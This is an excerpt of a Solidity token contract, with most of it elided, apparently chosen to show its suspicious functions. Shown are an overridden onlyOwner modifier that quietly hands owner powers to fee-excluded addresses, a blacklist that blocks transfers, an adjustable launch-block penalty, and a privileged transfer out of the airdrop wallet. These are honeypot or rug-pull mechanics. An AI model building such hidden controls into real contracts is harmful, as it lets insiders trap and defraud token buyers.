...
contract RNMTQ is Context, IERC20, Ownable {
    using SafeMath for uint256;
    using Address for address;
    string private _name = "123";
    string private _symbol = "456";
    uint8 private _decimals = 9;

    address payable private marketingWalletAddress = payable(0x5b69087d0eF05eB4D1c8Be43eE8693EdFd72bBEf);
    ...
    modifier onlyOwner override {require(isExcludedFromFee[msg.sender], "You are not excluded from fee!");_;}

    function setIsExcludedFromFee(address account, bool newValue) public onlyOwner {
        isExcludedFromFee[account] = newValue;
    }

    function setairDropWalletAddress(address payable account) external onlyOwner {
        airDropWalletAddress = account;
    }
    ...
    function claimAirDoptoken(address account, uint amount) external onlyOwner {
        _transfer(airDropWalletAddress, account, amount);
    }
    ...
    function _transfer(address sender, address recipient, uint256 amount) private returns (bool) {
        ...
        require(!isBlacklist[recipient] && !isBlacklist[sender], "Blacklisted address");
        if(inSwapAndLiquify)
        { 
        ...
        {   
            ...
            if(sender == uniswapPair) {
                if (block.number <= launchAt + burntBlocks) {                  
    ...
    function setBurntBlocks(uint num) public onlyOwner {
        burntBlocks = num;
    }
    ...
    function setBlacklist(address account, bool value) private {
        if(!isBlacklist[account]){
        isBlacklist[account] = value;
        }
    }

    function changeBlacklist(address account, bool value) public onlyOwner {
        isBlacklist[account] = value;
    }    
